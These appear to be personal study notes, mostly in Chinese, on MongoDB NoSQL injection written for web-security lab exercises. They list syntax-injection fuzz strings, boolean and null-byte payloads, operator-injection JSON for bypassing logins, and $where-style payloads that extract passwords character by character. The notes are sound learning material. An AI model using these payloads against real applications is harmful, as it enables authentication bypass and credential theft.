## NoSQL injection
- MongoDB
-  JSON 查詢
  
- **Syntax injection**
    - 注入您自己的有效載荷
    - 提交模糊字串和特殊字符
 
- **Operator injection**
    - 使用 NoSQL 查詢運算子

**Example :**
- https://insecure-website.com/product/lookup?category=fizzy
- this.category == 'fizzy'
- this.category == '\"`{\r;$Foo}\n$Foo \\xYZ\u0000
- https://insecure-website.com/product/lookup?category='%22%60%7b%0d%0a%3b%24Foo%7d%0d%0a%24Foo%20%5cxYZ%00

## Syntax injection
### 查詢哪些字元會被應用程式解釋為語法
- 注入單一字元 [`] : this.category == '''
  - 如果這導致原始回應發生變化，則可能表示該'字元破壞了查詢語法並導致了語法錯誤
  - Retest : this.category == '\''
 
### 確認條件行為
- 假 : ' && 0 && 'x (lookup?category=fizzy'+%26%26+0+%26%26+'x)
- 真 : ' && 1 && 'x (lookup?category=fizzy'+%26%26+1+%26%26+'x)
- 真 JavaScript 條件，例如 '||'1'=='1 (this.category == 'fizzy'||'1'=='1')

### Attack 
- 新增一個空字元 : %00
  - https://insecure-website.com/product/lookup?category=fizzy'%00
  - this.category == 'fizzy'\u0000' && this.released == 1

### Lab: Detecting NoSQL injection
- Ctrl U = url encode
- 有效負載: Gifts'+'
- 布林條件: Gifts' && 0 && 'x | Gifts' && 1 && 'x
- Gifts'||1||'

## Operator injection
### 運算符
- $where- 符合滿足 JavaScript 表達式的文件
- $ne- 符合所有不等於指定值的值
- $in- 符合數組中指定的所有值
- $regex- 選擇值與指定正規表示式相符的文件 <br>

**Method :**
- 巢狀物件插入 :{"username":{"$ne":"invalid"}}
-  URL 的輸入: username[$ne]=invalid
-  將請求方法從 轉換GET為POST。
-  將標題更改Content-Type為application/json。
-  將 JSON 新增到訊息正文。
-  在 JSON 中註入查詢運算 <br>

**Example :**
- {"username":"wiener","password":"peter"}
- {"username":{"$ne":"invalid"},"password":"peter"}
- {"username":{"$ne":"invalid"},"password":{"$ne":"invalid"}}
- {"username":{"$in":["admin","administrator","superadmin"]},"password":{"$ne":""}}

**Lab: Exploiting NoSQL operator injection to bypass authentication**
- 
## 擷取數據 
- 將 JavaScript 函數注入查詢
- 某些查詢運算子或函數可以執行有限的 JavaScript 程式碼
- MongoDB 的$where運算子和mapReduce()函數。

**Example :** 
- 傳回使用者密碼字串的第一個字符 : admin' && this.password[0] == 'a' || 'a'=='b
- 識別密碼是否包含數字 : admin' && this.password.match(/\d/) || 'a'=='b
